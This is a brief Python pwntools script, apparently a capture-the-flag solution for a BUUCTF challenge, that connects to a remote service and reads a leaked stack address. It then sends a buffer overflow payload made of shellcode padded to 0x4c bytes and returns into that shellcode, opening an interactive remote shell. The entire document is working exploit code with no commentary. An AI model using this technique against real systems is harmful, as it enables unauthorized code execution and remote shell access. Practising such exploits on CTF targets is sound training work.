from pwn import*
context.arch="i386"
p=remote("node3.buuoj.cn",25766)
p.recvuntil("Hei,give you a gift->")
buf_addr=int(p.recv(10),16)
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x48+4,'\0')+p32(buf_addr)
p.sendline(payload)
p.interactive()
